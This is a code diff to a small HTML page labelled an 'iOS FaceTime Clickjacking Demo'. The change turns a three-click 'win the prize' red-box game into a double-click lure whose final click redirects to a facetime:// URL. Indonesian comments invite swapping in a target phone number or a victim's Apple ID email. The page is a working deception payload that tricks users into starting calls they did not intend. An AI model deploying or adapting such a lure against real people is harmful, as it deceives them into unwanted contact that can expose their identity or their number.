@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>iOS Clickjacking Demo</title>
+  <title>iOS FaceTime Clickjacking Demo</title>
   <style>
     body {
       margin: 0;
@@ -34,7 +34,7 @@
 <body>
 
 <div id="redBox"></div>
-<div id="counter">Click 3x the red box to win!</div>
+<div id="counter">Double‑click the red box to win!</div>
 
 <script>
 let clickCount = 0;
@@ -43,11 +43,14 @@ document.getElementById("redBox").onclick = () => {
   clickCount++;
   document.getElementById("counter").innerText = "x" + clickCount;
 
-  // final click → trigger app
-  if (clickCount === 3) {
-    // pilih salah satu:
-    // window.location = "instagram://app";
-    window.location = "tel:+6281234567890";
+  // DOUBLE CLICK → FaceTime call
+  if (clickCount === 2) {
+    // GANTI target sesuai kebutuhan:
+    // nomor telepon:
+    window.location = "facetime://+6281234567890";
+
+    // atau email Apple ID:
+    // window.location = "facetime://victim@example.com";
   }
 };
 </script>
